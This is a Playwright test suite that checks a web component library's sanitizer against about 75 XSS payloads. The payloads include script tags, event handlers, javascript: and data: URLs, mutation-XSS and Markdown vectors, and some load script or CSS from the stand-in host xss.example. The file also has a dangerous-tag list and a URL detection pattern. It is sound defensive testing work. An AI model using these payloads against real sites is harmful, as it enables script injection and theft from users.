/**
 * XSS test suite.
 *
 * Runs on a page WITHOUT any CSP, so a sanitizer failure would really execute.
 * `alert`, `confirm`, `prompt` and `print` are replaced by traps, and every payload
 * that can run code sets `window.__xss`.
 *
 * Payloads: OWASP XSS Filter Evasion Cheat Sheet, known mutation-XSS (mXSS) vectors,
 * and Markdown-specific vectors.
 */
import { expect, test } from '@playwright/test';
import { NO_CSP, mount } from '../e2e/helpers.js';

const PAYLOADS = [
  // Script injection
  '<script>alert(1)</script>',
  '<SCRIPT SRC=https://xss.example/xss.js></SCRIPT>',
  '<script>window.__xss=1</script>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '"><script>alert(1)</script>',
  '</textarea><script>alert(1)</script>',
  '</title><script>alert(1)</script>',
  // Event handlers
  '<img src=x onerror=alert(1)>',
  '<IMG SRC=x onerror="javascript:alert(1)">',
  '<img src=x:alert(alt) onerror=eval(src) alt=0>',
  '<img/src=x/onerror=alert(1)>',
  '<img src="x"onerror="alert(1)">',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
  '<body onload=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
  '<select autofocus onfocus=alert(1)>',
  '<textarea autofocus onfocus=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>',
  '<video><source onerror=alert(1)>',
  '<audio src=x onerror=alert(1)>',
  '<div onmouseover="alert(1)">hover</div>',
  '<a onmouseover=alert(1)>x</a>',
  '<object data="javascript:alert(1)">',
  '<embed src="javascript:alert(1)">',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>parent.__xss=1</script>"></iframe>',
  '<form><button formaction=javascript:alert(1)>x</button></form>',
  '<isindex type=image src=1 onerror=alert(1)>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  // URL schemes
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
  '<a href="&#x6A;avascript:alert(1)">x</a>',
  '<a href="jav&#x09;ascript:alert(1)">x</a>',
  '<a href=" &#14;  javascript:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<img src="javascript:alert(1)">',
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  '<a xlink:href="javascript:alert(1)">x</a>',
  // Styles, meta, base
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<style>@import "https://xss.example/x.css";</style>',
  '<link rel=stylesheet href=https://xss.example/x.css>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="javascript:alert(1)//">',
  // mXSS / parser confusion
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
  '<math><mi><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
  '<a href="https://ok.example" id="x"><img name="body"></a><form id="document"></form>',
  '<template><script>alert(1)</script></template>',
  '<!--<img src=x onerror=alert(1)>-->',
  '<![CDATA[<script>alert(1)</script>]]>',
  // Markdown-specific
  '[x](javascript:alert(1))',
  '[x](JAVASCRIPT:alert(1))',
  '[x](javascript&#58;alert(1))',
  '[x](<javascript:alert(1)>)',
  '[x]( javascript:alert(1))',
  '[x](data:text/html,<script>alert(1)</script>)',
  '![x](javascript:alert(1))',
  '![x"onerror="alert(1)](x)',
  '[x](https://ok.example "title" onclick="alert(1)")',
  '<javascript:alert(1)>',
  '[ref]\n\n[ref]: javascript:alert(1)',
  '```html\n<script>alert(1)</script>\n```',
  '`<img src=x onerror=alert(1)>`',
  '> <img src=x onerror=alert(1)>',
  '| a |\n|---|\n| <img src=x onerror=alert(1)> |',
  '- [x] <img src=x onerror=alert(1)>',
];

const MODES = [
  { tag: 'vt-markdown', attrs: {} },
  { tag: 'vt-markdown', attrs: { 'allow-html': '' } },
  { tag: 'vt-markdown', attrs: { 'allow-html': '', variant: 'full', 'default-tab': 'split' } },
  { tag: 'vt-code', attrs: { language: 'html', variant: 'full' } },
  { tag: 'vt-code', attrs: { language: 'markdown' } },
  {
    tag: 'vt-json',
    attrs: { variant: 'full', depth: '5' },
    wrap: (p) => JSON.stringify({ [p]: [p, { p }] }),
  },
  { tag: 'vt-json', attrs: { view: 'raw' }, wrap: (p) => JSON.stringify({ p }) },
  { tag: 'vt-json', attrs: {}, wrap: (p) => p }, // invalid JSON path
  {
    tag: 'vt-csv',
    attrs: { variant: 'full' },
    wrap: (p) => `name,value\n"${p.replace(/"/g, '""')}",${p.length}`,
  },
  {
    tag: 'vt-tags',
    attrs: { counts: '', clickable: '' },
    wrap: (p) => JSON.stringify([p, { value: p, href: p, color: p, kind: p }]),
  },
  {
    tag: 'vt-tags',
    attrs: { mode: 'edit', variant: 'full' },
    wrap: (p) => JSON.stringify({ value: [p], options: [{ value: p, description: p, group: p }] }),
  },
  {
    tag: 'vt-diff',
    attrs: { variant: 'full' },
    wrap: (p) => `--- a\n+++ b\n@@ -1 +1 @@\n-${p.replace(/\n/g, ' ')}\n+${p.replace(/\n/g, ' ')}!`,
  },
];

/** Inspects every shadow root for dangerous markup. Runs in the page. */
function audit() {
  const problems = [];
  const DANGEROUS_TAGS = new Set([
    'script',
    'iframe',
    'object',
    'embed',
    'style',
    'form',
    'svg',
    'math',
    'base',
    'meta',
    'link',
    'frame',
    'frameset',
    'textarea',
    'select',
    'button',
    'video',
    'audio',
    'source',
    'template',
  ]);
  const URL_ATTRS = ['href', 'src', 'action', 'formaction', 'xlink:href', 'srcdoc', 'data'];
  const visit = (root) => {
    for (const el of root.querySelectorAll('*')) {
      const tag = el.localName;
      // Vitrine's own UI uses <button> and an inline <svg> icon set: only flag them in content areas.
      // Vitrine's own controls (copy buttons on code blocks) may sit inside content: the
      // sanitizer strips every class except language-*, so content can never forge `.btn`.
      const ownUi = el.closest('.btn');
      const inContent =
        !ownUi && el.closest('.markdown, .content, .tree [part="value"], .tree [part="key"]');
      if (inContent && DANGEROUS_TAGS.has(tag)) problems.push(`<${tag}> in content`);
      for (const attr of el.attributes) {
        if (/^on/i.test(attr.name)) problems.push(`${tag}[${attr.name}]`);
        if (attr.name === 'style' && inContent) problems.push(`${tag}[style] in content`);
        if (URL_ATTRS.includes(attr.name)) {
          // eslint-disable-next-line no-control-regex -- strips C0 controls like browsers do
          const value = attr.value.replace(/[\u0000- ]/g, '').toLowerCase();
          if (/^(javascript|vbscript|data:(?!image\/(png|gif|jpe?g|webp|avif);))/.test(value))
            problems.push(`${tag}[${attr.name}=${attr.value}]`);
        }
      }
      if (el.shadowRoot) visit(el.shadowRoot);
    }
  };
  visit(document);
  return problems;
}

test.describe('XSS payloads', () => {
  test.beforeEach(async ({ page }) => {
    await page.addInitScript(() => {
      const trap = () => {
        window.__xss = true;
      };
      window.alert = trap;
      window.confirm = trap;
      window.prompt = trap;
      window.print = trap;
    });
    await page.goto(NO_CSP);
  });

  for (const [modeIndex, mode] of MODES.entries()) {
    test(`${mode.tag} ${JSON.stringify(mode.attrs)} (#${modeIndex}) neutralizes every payload`, async ({
      page,
    }) => {
      for (const payload of PAYLOADS) {
        const content = mode.wrap ? mode.wrap(payload) : payload;
        await mount(page, mode.tag, mode.attrs, content);
        // Exercise interactive paths too: hover, focus and the search bar.
        await page.locator('#el').hover();
        await page.waitForTimeout(30);
        const problems = await page.evaluate(audit);
        expect(problems, `payload: ${payload}`).toEqual([]);
      }
      await page.waitForTimeout(300);
      expect(await page.evaluate(() => window.__xss), 'a payload executed').toBeUndefined();
    });
  }

  test('label and title attributes are rendered as text', async ({ page }) => {
    for (const payload of PAYLOADS.slice(0, 20)) {
      await mount(page, 'vt-code', { variant: 'full', label: payload }, 'x');
      await expect(page.locator('#el [part="title"]')).toHaveText(
        payload.replace(/\s+/g, ' ').trim().slice(0, 200),
      );
    }
    expect(await page.evaluate(audit)).toEqual([]);
    expect(await page.evaluate(() => window.__xss)).toBeUndefined();
  });

  test('search queries are never interpreted as markup', async ({ page }) => {
    await mount(page, 'vt-code', { variant: 'full' }, '<img src=x onerror=alert(1)>');
    await page.locator('#el').getByRole('button', { name: 'Search' }).click();
    await page.locator('#el').getByRole('searchbox').fill('<img src=x onerror=alert(1)>');
    await expect(page.locator('#el [part="search-count"]')).toHaveText('1 / 1');
    expect(await page.evaluate(audit)).toEqual([]);
    expect(await page.evaluate(() => window.__xss)).toBeUndefined();
  });

  test('render() ignores event handler options', async ({ page }) => {
    await page.evaluate(() =>
      window.Vitrine.render(document.getElementById('root'), {
        type: 'code',
        content: 'x',
        options: { onclick: 'alert(1)', onMouseOver: 'alert(1)', label: '<b>x</b>' },
      }),
    );
    const el = page.locator('vt-code');
    expect(await el.getAttribute('onclick')).toBe(null);
    expect(await el.getAttribute('onmouseover')).toBe(null);
    await el.click();
    await el.hover();
    expect(await page.evaluate(() => window.__xss)).toBeUndefined();
    // Vitrine's own attributes starting with "on" still work (they contain a dash).
    await page.evaluate(() =>
      window.Vitrine.render(document.getElementById('root'), {
        type: 'json',
        content: '{',
        options: { onInvalid: 'raw' },
      }),
    );
    expect(await page.locator('vt-json').getAttribute('on-invalid')).toBe('raw');
  });
});

test.describe('Network side channels', () => {
  test('blocked images are never requested', async ({ page }) => {
    const requests = [];
    page.on('request', (r) => requests.push(r.url()));
    await page.goto(NO_CSP);
    for (const images of ['block', 'same-origin']) {
      await mount(
        page,
        'vt-markdown',
        { images, 'allow-html': '' },
        '![a](https://tracker.example/a.png) <img src="https://tracker.example/b.png">',
      );
    }
    await page.waitForTimeout(300);
    expect(requests.filter((url) => url.includes('tracker.example'))).toEqual([]);
  });

  test('content of vt-code and vt-json never triggers requests', async ({ page }) => {
    const requests = [];
    page.on('request', (r) => requests.push(r.url()));
    await page.goto(NO_CSP);
    const before = requests.length;
    const payload =
      '<img src="https://tracker.example/c.png"><link rel=stylesheet href="https://tracker.example/d.css">';
    await mount(page, 'vt-code', { language: 'html' }, payload);
    await mount(page, 'vt-json', { variant: 'full' }, JSON.stringify({ payload }));
    await page.waitForTimeout(300);
    expect(requests.slice(before).filter((url) => url.includes('tracker.example'))).toEqual([]);
  });
});
